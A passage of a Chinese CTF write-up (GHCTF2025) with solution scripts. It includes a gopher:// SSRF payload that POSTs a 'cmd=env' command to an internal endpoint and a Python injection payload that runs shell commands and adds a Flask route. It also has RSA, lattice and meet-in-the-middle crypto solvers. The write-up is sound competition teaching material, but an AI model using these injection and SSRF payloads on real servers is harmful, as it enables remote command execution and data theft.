class="line"><span class="string">&#123;&#125;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    host, content_length, content</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line">new = tmp.replace(<span class="string">&quot;%0A&quot;</span>, <span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">result = urllib.parse.quote(new)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gopher://&quot;</span> + host + <span class="string">&quot;/_&quot;</span> + result)</span><br><span class="line"><span class="comment"># gopher://127.0.0.0:8000/_POST%2520/Manage%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.0%253A8000%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25207%250D%250A%250D%250Acmd%253Denv</span></span><br></pre></td></tr></table></figure><p>Web狗一定要经历的题目：开局一张图和一段话</p><h2 id="Message-in-a-Bottle-plus">Message in a Bottle plus</h2><p>也是谜语人题目，好在hint给出了是python语法错误，那就用三引号注释你要注入的语句就好了。我用的写静态文件，&lt;&gt;过滤了可以用tee写语句<br>payload:</p><pre><code>&quot;&quot;&quot;%__import__('os').system('cat /f*|tee /tmp/flag')#&quot;&quot;&quot;&quot;&quot;&quot;%exec('@__import__(&quot;sys&quot;).modules[&quot;__main__&quot;].__dict__[&quot;app&quot;].route(&quot;/flag&quot;, methods=[&quot;GET&quot;])\ndef index():\n    return open(&quot;/tmp/flag&quot;).read()')#&quot;&quot;&quot;</code></pre><h1 id="Crypto">Crypto</h1><h2 id="baby-factor-revenge">baby_factor_revenge</h2><p>首先求出三素数情况的d后根据d分解n，得到两个数。就可以得到一个参数了。剩下两个用z3解。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">d = <span class="number">983319791937448948928909831815966155233467749135983797957993410537719382800936387914281107353766335692424029654890074457307384264696437387167917818931646208361090037151617583726270784856753326990295824691796694451427308596706773907163324576689188410501943156770608241886959042932405074514173029345911147314721915393623818058459418750161717021341964881781486599220732192574569147314948870274178618505914400519303058946065649007754746530391162684602214360864817520399909831939250530896872612423835389116308382365739456837700087971535009764751628912913521138584334716329828771071208136538108215589915295297620190642161344576127809192931232824504965519434322583351610813141539165132478322539755184703347361403277074761984135194481834469890501869197790850740673232484884785271004904890460014867888014459560750704493982023858930509540465683453067731362712507808067213106132609335347367580166670909669153896510120696647745399737473</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_pq</span>(<span class="params">e, d, n</span>):</span><br><span class="line">    k = e * d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x - <span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x - <span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = divide_pq(e, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># phi=(p-1)*(q-1)</span></span><br><span class="line"><span class="comment"># pq = p * q</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line">phi1 = <span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984394758254181484105857103844940487787404078873566779953101987404891507588290232992132681729619718279684673827347612899406697514777723904351697638562060304399923174376216080338949397741477013367831377040866937433520175862575061413321076151761545984886547872427147498175814451096795344136954743868643889768901204954902708679102384061694877757565486240670882343628571424084461972849147495569088820011108794930593172573959423278140327579049114196086428504291102619820322231225943837444001821535593671764186251713714593498207219093585758479440828038119079608764008747539277397742897542501803218788455452391287578171880267200</span></span><br><span class="line">pq = <span class="number">21009426005084759232502759692644666270422766568724834588101478223308318987057447041530247306447091103185539171062472702301557335160742767671134173904609940105768749896994581616450301992878881928721883119386522423321223324015378278104501172477359823290965487912511985763442815234300763864548546872584570684767716406581268136218513007832843753027658989660444693029077101168497144645259104522047135596501556552096480603415253950722528034420729301954683657122537365925866396024352730390201624908120253411753527148449412666376617568880825229861575079723105510923185944036315338425866120714706124444357547089012719641816001</span></span><br><span class="line">r = <span class="number">151925555068309740027629873616844956416777676942104988548600500604734980705751500202455811525437316981852933269865712140204105818819734994452674160925578679385681053244060180042799265901275164392807664922780095166647350519792074240010137576702747299629682862274167454415537848662371715182873269954851056702833</span></span><br><span class="line"><span class="keyword">assert</span> pq * r == n1</span><br><span class="line">phi = phi1 // (r - <span class="number">1</span>)</span><br><span class="line">n2 = n1 // r</span><br><span class="line">p = Int(<span class="string">&quot;p&quot;</span>)</span><br><span class="line">q = Int(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add((p - <span class="number">1</span>) * (q - <span class="number">1</span>) == phi)</span><br><span class="line">s.add(p * q == pq)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"></span><br><span class="line">p = <span class="number">118589237846929157177145636173700007714734296636618078863121028787719233856255349991676793277685489964300857832756581934799294586957137083742162225794737817065789645999587706703620635609191140301627049542092790079764008202073952667787393392675044942337058473033104592846222792727822005560480411401441075365471</span>,</span><br><span class="line">q = <span class="number">151925555068309740027629873616844956416777676942104988548600500604734980705751500202455811525437316981852933269865712140204105818819734994452674160925578679385681053244060180042799265901275164392807664922780095166647350519792074240010137576702747299629682862274167454415537848662371715182873269954851056702833</span></span><br><span class="line">c = <span class="number">8847973599594272436100870059187158819529199340583461915617467299706215012295598155778224026186157290320191983062022702191439286020733625396165573681688842631368993650799220713225485752608650482408353598320160571916055498330875851476520668973214124194890108144336715482373743731578734960096351460142579903010557821654345995923836938260379746304222820835040419844947019844885128550552066290798665884099701340641403329066058638137944934073185448687990744852400616823426082588916251127609191094346267837812018236673478691437630461425526779014305216914035039981685211625653600564431704400207095883904994772993227506462664</span></span><br><span class="line">n2=p*q</span><br><span class="line">phi2=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d2=inverse(e,phi2)</span><br><span class="line">m2=<span class="built_in">pow</span>(c,d2,n2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br></pre></td></tr></table></figure><h2 id="baby-lattice">baby_lattice</h2><p>经典的HNP问题</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">p = <span class="number">13401991645840298882794100147034379521242237285821020793208518466205688272722127694554243298223159648613332253774886696888511245155898681828972316158766813</span></span><br><span class="line">c = [</span><br><span class="line">    <span class="number">3547025130757031371763547817278671805806523773597386380426228204353325314755125874825372064344551510783942287325061869515563511720377069479838665918916338</span>,</span><br><span class="line">    <span class="number">561524185998066303459395863084068415723518371857539287162474295289737845979144864495515229777991463363132381517905379393086271602757286846999926034367409</span>,</span><br><span class="line">    <span class="number">10630918988200018501478600883655233518093875635494077893436132190015060760951001030031068630865667129447250982542911493607849695255758299063471724885107320</span>,</span><br><span class="line">    <span class="number">5385738167688714294394456876987750423263279740302210790063861475593679005286633965917637168163655774852001750955925563171806165861440634515967640179944804</span>,</span><br><span class="line">    <span class="number">3686451063569312252337028014973428925521749963152262622523483348285262144703447272544972123815729823760936936761643322992469583780002855185407873398768127</span>,</span><br><span class="line">    <span class="number">9596580956215126253893458055745193704575088913515678341231900675542245449333964660007025564677263334281046226112471415925784249910282102204627251580303047</span>,</span><br><span class="line">    <span class="number">9656829597739031272294632966205884640125918053307645634673206826103547310810254891833432384622548154588598670746803614688469837172848481449498079690935715</span>,</span><br><span class="line">    <span class="number">9907308304392368929600091658386459655450451232070442677496713774343506026327224070703486188335961098033888098971263207077722473044862118000082007110037557</span>,</span><br><span class="line">    <span class="number">7839372385123283975949639433665292734490760458360682832497005213559939527031767909811695257768341209806346811519315554587887588294359891829457980910373676</span>,</span><br><span class="line">    <span class="number">9524560447616291402016995361580593070951296833074538783490159546001656765257005901587161833656370873513309819850104060230660386406669378214335512722509152</span>,</span><br><span class="line">    <span class="number">8734422874517209772760818316188000967216535009508164549745674472106165337990045713973843427581730460676070294620298664038968581128044873585552989614725336</span>,</span><br><span class="line">    <span class="number">5148158222052082942951739997892280954937954769195857112271289335776175568625514426629773392655353554820374445881301175856523121361252868192790918069469104</span>,</span><br><span class="line">    <span class="number">3405639365216597742633558534342314393231966921971024333387009357007031255109911181571542920889177048552084631482291912851876735480121959418518626599223928</span>,</span><br><span class="line">    <span class="number">6965895908963098896413697893751255263053889382630643791713636829201586125658579731479485123904224727756791164618191156426250811133029277086293720268527300</span>,</span><br><span class="line">    <span class="number">515472047175628755463279789359658211455570096067652817360508027869002916852457796014115363850477155232728049656195126940493402028508630979737222916876246</span>,</span><br><span class="line">    <span class="number">8377848726362282033165443045774756072489017398005262818165334796393061408947900148462399707261050565348807577258621241416711089587307194346694505937252864</span>,</span><br><span class="line">    <span class="number">1178755053483981880338850194698011124968424379914871101461970724324613752209283539401502897388962321646518511682063263530792638817282211333222820982688221</span>,</span><br><span class="line">    <span class="number">6409725586399153562174435158247599193499008381130383743433623949976530392240171542527657077771723107664747118903213393154893390715457247849808357209465942</span>,</span><br><span class="line">    <span class="number">3372824803484968486680937546271819996332625362891283809637871759604598252172343794474197823370030403360262989580844260103083478034905726890611202238641340</span>,</span><br><span class="line">    <span class="number">13221067729455004299677399984872603663881675510140157358091630484387026309376774076498558628883879446483977202290444900329681753187886973457338777404374837</span>,</span><br><span class="line">    <span class="number">7168388056726802823482632673894477305062116631923141017136239676696007696629606782541016490173953868270727600022309320772114799519383514048456314407549126</span>,</span><br><span class="line">    <span class="number">5250230933448962245502125593869313477032913928941516938273943408457441209365441112912617832856547549404891414953525445963675011329667621804152746371657313</span>,</span><br><span class="line">    <span class="number">8511291855606246692070730459514263912089592580342504124890734122750181111943376656479213361961009582891618556261302703133404839204999651359329176948170842</span>,</span><br><span class="line">    <span class="number">10576966024912004586600985705328475294820172279541596349092328002861342696932964481093301707680584309062968518297314914578723605267596141569538103299931592</span>,</span><br><span class="line">    <span class="number">12610576251820483830699440118009518195547953924641848179631259695652398482759919292823264035055444639679877606276670927735340951916197191958922906156370663</span>,</span><br><span class="line">    <span class="number">3742260845065949575192054445757226288737527960324254459850715703182879384214273141678432129201712761002566924178045796602250837169613100836509080462118064</span>,</span><br><span class="line">    <span class="number">11563799338655584285772430060426469486983276581413105960901201146319641194721216394735314795999096052047566733050321685673448559752053334666493545565267458</span>,</span><br><span class="line">    <span class="number">2135904971793751083168704063674429207856744601756475004904460101727999030934815461118290836502605293753384609825541213034656253854812143724421464450937515</span>,</span><br><span class="line">    <span class="number">3115138049292154301818359336614981367419382594686950083225042221335435796679806070685800479754927915293066789893346628151325862299622031407323031470432866</span>,</span><br><span class="line">    <span class="number">11834987428374239733081967249175125232293539826462896997963240557834259212701171232384194311849363016441847536816726226234955703291712817155658535826680986</span>,</span><br><span class="line">]</span><br><span class="line">a = [</span><br><span class="line">    <span class="number">8016983781273189754281912962247057409930227455812224730112055674262101679986538896353333785641031178561641562965339977035588567181180100475283408488320671</span>,</span><br><span class="line">    <span class="number">12980173980684618239567238092970002844391225790428809984588444288874980047043175328056782109973890659670718383856150425014293022930574469326618263083648099</span>,</span><br><span class="line">    <span class="number">8109856702010014482292978050018141635784057812487351143916154508689142112615449144377702002382005662470835964315028619291602564624893518861557701327890923</span>,</span><br><span class="line">    <span class="number">12785373226115694299429762427866573289359143336748874789256870948157808484043436344897926547699412946084053665605873366419653263394817308889578649556482317</span>,</span><br><span class="line">    <span class="number">12293720016807713691819354075258380849321736691923473670291035750221768289875347194928451102365603432383881559318603460687890903510706219895796459019974867</span>,</span><br><span class="line">    <span class="number">9784378896444105030039569921777285228994264456281120536753266782980679466146906618674672118057906497814953677764528302638725540882074537262487534252076829</span>,</span><br><span class="line">    <span class="number">9241433814815706758885649801540944918822400007457713603674159882791199750057709773097552334465041959969676782253637817171507122904345522225398825682237481</span>,</span><br><span class="line">    <span class="number">11204803848333722110323297716136514262820561394355433234423667799557561253910421337700868735544193790444406938869863716247161888020220901893711513603634809</span>,</span><br><span class="line">    <span class="number">10851090251796215969502640347727949807230163009657915435491546953253351810608099195268759626721620529756828379004467476267712531905975334082089231769707617</span>,</span><br><span class="line">    <span class="number">11250957460128461102060212243723539805901629603092001540925013383541943835129096257407578679799378517176957440298695788786794500447140718667332595080944869</span>,</span><br><span class="line">    <span class="number">12248623923069220370917375593286718711586079377902376988707257328512455851210970182518826733646869485671374318338949112466814956514662420760908691130244383</span>,</span><br><span class="line">    <span class="number">11061068271412202445428992286301637014530049371871820612053163253748795430394720967354122057185625710764847486790478210908967065668096047462000900877243843</span>,</span><br><span class="line">    <span class="number">9250800791153158078642768324800520716511537203538708124830844957330029236789799844775267058446261708862442981956837389747149720449997356553753692631237873</span>,</span><br><span class="line">    <span class="number">11442112467994330302413453979716258058149104607244851803491048585747359474970005873336772224480265499136742622823880716879860377641238675210553131052206691</span>,</span><br><span class="line">    <span class="number">8851268226889934481971979527547782930762103134830344221114784617526682434893736517219781937490279514229768881864475696389373739501629994242420024622585309</span>,</span><br><span class="line">    <span class="number">8761826274329402585517262093482651333161640060627583337505498299736119877176278155436111156185319629046980645810012652601825582701466570339570478108791887</span>,</span><br><span class="line">    <span class="number">8173260008522260126563915135008278248111293487661172115633899079869720932758788675224579864948752039769531398938248083971071345978173279466336354696742377</span>,</span><br><span class="line">    <span class="number">11733325877716881936637372036969125985631514189799569847189115606745019694984456424617859168884541552882900918661071180298079869943357668081866511603361429</span>,</span><br><span class="line">    <span class="number">12798678249651545625305346509566263707129030745621625744465668772298872710674031103310015594375483838020916596533864897632924958154707810583510669376046159</span>,</span><br><span class="line">    <span class="number">11972367565183102195894957634073708898746516169055154830786380821612631063771935949099855541345280195465211676841845799521135332692746439801114025346776451</span>,</span><br><span class="line">    <span class="number">8309485355838062558333744941897142201736283502970173073711189070760311131678107029730686549988329677109870570827466668034034377094834508445549924223585219</span>,</span><br><span class="line">    <span class="number">10037957030668927878463105058548635761147918169468443696251870837018029994579358415317101911755591591785037623566701920710453008930531891302329922308475079</span>,</span><br><span class="line">    <span class="number">13221078857886779075714191159549244640144219704164657103905516889650093241197471185563906205007376146027157620524696025494715411571586859030421582641250071</span>,</span><br><span class="line">    <span class="number">13377141034964464295846379646837504968557246139611266461228568513844912255762222441387410898249170108735540582627742796017922462329606088337301365183628591</span>,</span><br><span class="line">    <span class="number">11503417590216916228951909788782481610038959664264972733435373475346403291387209063270057139621628854733942831548624992555175497319058962145185736395531609</span>,</span><br><span class="line">    <span class="number">10682562966818807073688884352394574841623385668134186058213080078637580526582062737913378756835873195913042020318042792997704842570481165538229628253983417</span>,</span><br><span class="line">    <span class="number">7009494733984067792833862756223517770477471938386639921019003601598472840183655333614008677846799784155444425042016748876974547683111073376705004070094301</span>,</span><br><span class="line">    <span class="number">9396274922380984183217450286560296708001013262936289587249206096013034374236192395477584831821730898646879768741299571262843654547918064041618890696711333</span>,</span><br><span class="line">    <span class="number">9055143657462834722016836241561857041386247088507191351272758917384350750091500866289528933248085632291073921554368989805281660196853938630560350667255913</span>,</span><br><span class="line">    <span class="number">7075881589550115729079726581415060529537262743216265811601339312252250745864621882784185460812341989475906020671174894015501378625757286896275136526488817</span>,</span><br><span class="line">]</span><br><span class="line">iv=<span class="string">b&#x27;\x88\x0c\x7f\x92\xd7\xb7\xaf4\xe4\xfb\xd1_\xab\xff)\xb8&#x27;</span></span><br><span class="line">ciphertext=<span class="string">b&#x27;\x94\x198\xd6\xa2mK\x00\x06\x7f\xad\xa0M\xf7\xadV;EO$\xee\xcdB0)\xfb!&amp;8%,M&#x27;</span></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(a)</span><br><span class="line"></span><br><span class="line">M = Matrix(QQ, n + <span class="number">2</span>, n + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line"></span><br><span class="line">    M[i, i] = p</span><br><span class="line">    M[-<span class="number">2</span>, i] = a[i]</span><br><span class="line">    M[-<span class="number">1</span>, i] = -c[i]</span><br><span class="line"></span><br><span class="line">K = <span class="number">2</span> ^ <span class="number">400</span></span><br><span class="line">t = K / p</span><br><span class="line"></span><br><span class="line">M[-<span class="number">2</span>, -<span class="number">2</span>] = t</span><br><span class="line">M[-<span class="number">1</span>, -<span class="number">1</span>] = K</span><br><span class="line"></span><br><span class="line">L = M.LLL()</span><br><span class="line"></span><br><span class="line">x = L[<span class="number">1</span>][-<span class="number">2</span>] // t</span><br><span class="line">m = x % p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(m))</span><br><span class="line">key=<span class="built_in">int</span>(m)</span><br><span class="line"><span class="keyword">if</span> key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    key_aes = <span class="built_in">str</span>(key).encode()[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(key_aes, AES.MODE_CBC, iv)</span><br><span class="line">    flag = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="comment"># 去除可能的填充</span></span><br><span class="line">    flag = flag[:-flag[-<span class="number">1</span>]].decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to recover key&quot;</span>)</span><br><span class="line"><span class="comment"># Flag: NSSCTF&#123;F@@@un7_L4444t1c3333!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="MIMT-RSA">MIMT_RSA</h2><p>已知KEY不是素数。设 KEY = u * v，其中 u为 18 位以内的正整数（2 &lt;= u &lt; 2^18, u&lt;=v）。U=pow(u,e,n),V=pow(v,e,n)，ck=U*V，则可以预先跑出U，再遍历V，用哈希表查找。实际上v大概为一个20位的数。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, isPrime</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的 RSA 参数（根据题目输出）</span></span><br><span class="line">n = <span class="number">26563847822899403123579768059987758748518109506340688366937229057385768563897579939399589878779201509595131302887212371556759550226965583832707699167542469352676806103999861576255689028708092007726895892953065618536676788020023461249303717579266840903337614272894749021562443472322941868357046500507962652585875038973455411548683247853955371839865042918531636085668780924020410159272977805762814306445393524647460775620243065858710021030314398928537847762167177417552351157872682037902372485985979513934517709478252552309280270916202653365726591219198063597536812483568301622917160509027075508471349507817295226801011</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">ck = <span class="number">8371316287078036479056771367631991220353236851470185127168826270131149168993253524332451231708758763231051593801540258044681874144589595532078353953294719353350061853623495168005196486200144643168051115479293775329183635187974365652867387949378467702492757863040766745765841802577850659614528558282832995416523310220159445712674390202765601817050315773584214422244200409445854102170875265289152628311393710624256106528871400593480435083264403949059237446948467480548680533474642869718029551240453665446328781616706968352290100705279838871524562305806920722372815812982124238074246044446213460443693473663239594932076</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设 KEY = u * v，其中 u为 18 位以内的正整数（2 &lt;= u &lt; 2^18, u&lt;=v）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预计算 u^e mod n 建立字典</span></span><br><span class="line">table = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> u <span class="keyword">in</span> trange(<span class="number">2</span>, <span class="number">1</span> &lt;&lt; <span class="number">18</span>):</span><br><span class="line">    U = <span class="built_in">pow</span>(u, e, n)</span><br><span class="line">    table[U] = u</span><br><span class="line"></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> trange(<span class="number">1</span> &lt;&lt; <span class="number">18</span>, <span class="number">1</span> &lt;&lt; <span class="number">30</span>):</span><br><span class="line">    V = <span class="built_in">pow</span>(v, e, n)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        inv_V = inverse(V, n)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span>  <span class="comment"># 如果不可逆则跳过</span></span><br><span class="line">    candidate = (ck * inv_V) % n</span><br><span class="line">    <span class="keyword">if</span> candidate <span class="keyword">in</span> table:</span><br><span class="line">        u = table[candidate]</span><br><span class="line">        KEY = u * v</span><br><span class="line">        <span class="comment"># 验证 KEY 是否为 36 位且非素数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found KEY:&quot;</span>, KEY)</span><br><span class="line">        flag = <span class="string">b&quot;NSSCTF&#123;&quot;</span> + md5(<span class="built_in">str</span>(KEY).encode()).hexdigest().encode() + <span class="string">b&quot;&#125;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag.decode())</span><br><span class="line">        found = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">assert</span> KEY.bit_length() == <span class="number">36</span> <span class="keyword">and</span> <span class="keyword">not</span> isPrime(KEY)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有找到符合条件的 KEY&quot;</span>)</span><br><span class="line"><span class="comment"># Found KEY: 62495925932 Flag: NSSCTF&#123;14369380f677abec84ed8b6d0e3a0ba9&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="baby-signin">baby_signin</h2><p>e很小是phi的因子，用AMM有限域开方。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p= <span class="number">182756071972245688517047475576147877841</span></span><br><span class="line">q= <span class="number">305364532854935080710443995362714630091</span></span><br><span class="line">c= <span class="number">14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line">n= <span class="number">55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line">e= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        <span class="comment"># 普普通通中国剩余定理</span></span><br><span class="line">        m = crt(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">        flag = libnum.n2s(<span class="built_in">int</span>(m))</span><br><span class="line">        <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;NSS&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># NSSCTF&#123;4MM_1s_so_e4s7!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Misc">Misc</h1><h1 id="AI">AI</h1><h2 id="Mortis">Mortis</h2><p><img src="/img/WP/GHCTF2025/soyo.png" alt="soyo.png"><br><a href="http://public.py">public.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Some code in app.py</span></span><br><span class="line"><span class="comment"># Something was removed or modified</span></span><br><span class="line"><span class="comment"># It&#x27;s a challenge of AI Security, please don&#x27;t attack web server</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MortisNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(MortisNet, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.conv2 = nn.Conv2d(<span class="number">16</span>, <span class="number">32</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.conv3 = nn.Conv2d(<span class="number">32</span>, <span class="number">64</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.dropout1 = nn.Dropout(<span class="number">0.32123432</span>)</span><br><span class="line">        <span class="variable language_">self</span>.fc1 = nn.Linear(<span class="number">64</span> * <span class="number">64</span> * <span class="number">64</span>, <span class="number">512</span>)</span><br><span class="line">        <span class="variable language_">self</span>.fc2 = nn.Linear(<span class="number">512</span>, <span class="number">64</span>)</span><br><span class="line">        <span class="variable language_">self</span>.fc3 = nn.Linear(<span class="number">64</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.conv1(x))</span><br><span class="line">        x = F.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.conv2(x))</span><br><span class="line">        x = F.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.conv3(x))</span><br><span class="line">        x = F.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = torch.flatten(x, <span class="number">1</span>)</span><br><span class="line">        x = <span class="variable language_">self</span>.dropout1(x)</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.fc1(x))</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.fc2(x))</span><br><span class="line">        x = torch.sigmoid(<span class="variable language_">self</span>.fc3(x))</span><br><span class="line">        